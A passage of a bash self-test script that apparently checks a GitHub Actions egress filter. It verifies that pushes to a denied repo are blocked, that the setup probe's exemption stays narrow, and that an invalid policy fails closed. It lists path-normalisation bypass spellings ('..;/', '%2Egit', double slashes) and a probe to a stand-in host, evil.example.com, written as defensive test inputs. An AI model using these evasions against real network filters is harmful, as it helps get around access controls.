    url=https://github.com/$GITHUB_REPOSITORY; [ $form = dotgit ] && url=$url.git
    rm -rf /tmp/gd-clone; out=$(git clone -q --depth 1 "$url" /tmp/gd-clone 2>&1)
    pass_if GD.clone-$form $? "git clone $url (the denied repo is still readable) -> ${out:-ok}"
  done
  out=$(git fetch -q --depth 1 origin 2>&1); pass_if GD.fetch $? "git fetch origin -> ${out:-ok}"

  rp='portswigger-tim/safer-runner-action-test/git-receive-pack'
  sel='.host=="github.com" and .method=="POST" and (.path|ascii_downcase|test("git-receive-pack")) and .verdict=="BLOCK" and .reason=="path-not-allowed"'
  br="srt-git-deny-probe-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT-$RANDOM"
  for ver in HTTP/1.1 HTTP/2; do
    for form in plain dotgit mixedcase; do
      case $form in
        plain) url=https://github.com/$GITHUB_REPOSITORY ;;
        dotgit) url=https://github.com/$GITHUB_REPOSITORY.git ;;
        mixedcase) url=https://github.com/Portswigger-Tim/Safer-Runner-Action-Test.git ;;
      esac
      expect_blocked "GD.push-$form-${ver#HTTP/}" "git push ($ver) $url (rule $rp: NONE)" "$sel" \
        git -c http.version="$ver" push "$url" "HEAD:refs/heads/$br-$form"
      out=$(git ls-remote "https://github.com/$GITHUB_REPOSITORY" "refs/heads/$br-$form" 2>&1)
      if [ -z "$out" ]; then record "GD.push-$form-${ver#HTTP/}-absent" PASS "no branch $br-$form on the remote"
      else record "GD.push-$form-${ver#HTTP/}-absent" FAIL "branch was created: $out"; git push -q "https://github.com/$GITHUB_REPOSITORY" --delete "$br-$form" || true; fi
    done
  done

  # Equivalent spellings of a denied path, and the short repo name (unauthenticated POSTs: if
  # the filter let one through, GitHub itself would refuse it)
  for p in \
    /portswigger-tim//safer-runner-action-test.git/git-receive-pack \
    /portswigger-tim/safer-runner-action-test.git//git-receive-pack \
    /portswigger-tim/safer-runner-action-test/git-receive-pack/ \
    '/portswigger-tim/safer-runner-action-test;x/git-receive-pack' \
    /portswigger-tim/safer-runner-action-test%2Egit/git-receive-pack \
    '/portswigger-tim/public/..;/safer-runner-action-test/git-receive-pack' \
    /portswigger-tim/public/../safer-runner-action-test.git/git-receive-pack \
    /srt/x/git-receive-pack /srt/x.git/git-receive-pack /SRT/X.git/git-receive-pack; do
    enc=$(printf '%s' "$p" | tr -c 'A-Za-z0-9' '_' | sed -E 's/_+/_/g' | cut -c2-60)
    expect_blocked "GD.path-$enc" "POST github.com$p" '.host=="github.com" and .method=="POST" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
      curl -sS -m 15 --path-as-is -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/x-git-receive-pack-request' --data-binary '' "https://github.com$p"
  done
  # the baseline really is broad: a push POST to any other repo passes the filter (GitHub answers)
  expect_passed GD.baseline-other-repo "POST github.com/octocat/Hello-World.git/git-receive-pack (baseline *: *)" \
    '.host=="github.com" and .path=="/octocat/Hello-World.git/git-receive-pack" and .filter=="allow" and .filter_rule=="*"' \
    curl -sS -m 15 -i -X POST -H 'Content-Type: application/x-git-receive-pack-request' --data-binary '' https://github.com/octocat/Hello-World.git/git-receive-pack
}

# enforce job: github.com { "portswigger-tim/safer-runner-action-test/*": "*" } - a filter that
# would refuse the action's own setup probe (GET github.com/robots.txt). Setup must pass, and the
# probe's exemption must not open anything else.
http_filter_selftest() {
  local out bogus=192.0.2.1 r="--resolve github.com:443:192.0.2.1"
  out=$(jq -c . /var/log/safer-runner/selftest.json 2>&1)
  jq -e 'length == 3 and all(.ok)' /var/log/safer-runner/selftest.json >/dev/null 2>&1
  pass_if ST.setup-selftests $? "setup passed with github.com filtered: $out"
  expect_blocked ST.robots-filtered "GET github.com/robots.txt (an ordinary request: filtered)" \
    '.host=="github.com" and .path=="/robots.txt" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' https://github.com/robots.txt
  expect_passed ST.probe-exempt "the exact setup probe (GET /robots.txt dialled at $bogus) is exempt" \
    ".host==\"github.com\" and .path==\"/robots.txt\" and (.dst|startswith(\"$bogus:\")) and (has(\"filter\")|not)" \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' $r https://github.com/robots.txt
  # every variation of the probe is an ordinary request again
  expect_blocked ST.probe-query "probe + query string" '.host=="github.com" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' $r 'https://github.com/robots.txt?d=srt-canary'
  expect_blocked ST.probe-post "probe as POST with a body" '.host=="github.com" and .method=="POST" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' $r -X POST --data-binary 'srt-canary' https://github.com/robots.txt
  expect_blocked ST.probe-case "probe with another path case" '.host=="github.com" and .path=="/Robots.txt" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' $r https://github.com/Robots.txt
  expect_blocked ST.probe-other-path "other path dialled at $bogus" '.host=="github.com" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' $r https://github.com/octocat/Hello-World.git/info/refs
  expect_blocked ST.probe-other-host "another host dialled at $bogus" '.sni=="evil.example.com" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "evil.example.com:443:$bogus" https://evil.example.com/robots.txt
  out=$(git ls-remote "https://github.com/$GITHUB_REPOSITORY" HEAD 2>&1)
  pass_if ST.own-repo-readable $? "the filter still allows this repo: ${out:0:60}"
}

# enforce + an invalid http-filter: setup must fail closed (no analyze fallback). The action step
# has continue-on-error so this step can look; a real job stops there.
http_filter_invalid() { # SR_OUTCOME: the action step's outcome
  [ "${SR_OUTCOME:-}" = failure ]; pass_if HI.action-failed $? "action step outcome: ${SR_OUTCOME:-<unset>} (want failure)"
  # Nothing was installed in ANY mode: an analyze fallback would leave a marker, a policy and a
  # running proxy writing a flow log. (The pre step's own conclusion can't show this: with
  # continue-on-error a failed pre step is reported as success.)
  [ ! -e /etc/safer-runner/setup-complete ]; pass_if HI.no-setup-marker $? "no setup-complete marker (nothing was set up, in any mode)"
  [ ! -e /etc/safer-runner/policy.json ] && [ ! -e "$FLOWLOG" ]
  pass_if HI.no-policy $? "no policy.json and no flow log"
  ! systemctl is-active -q safer-runner-proxy 2>/dev/null; pass_if HI.no-proxy $? "safer-runner-proxy not running"
}

trap 'record "harness.$1" FAIL "checks.sh $1 aborted (line $LINENO)"' EXIT
"${1//-/_}"
trap - EXIT
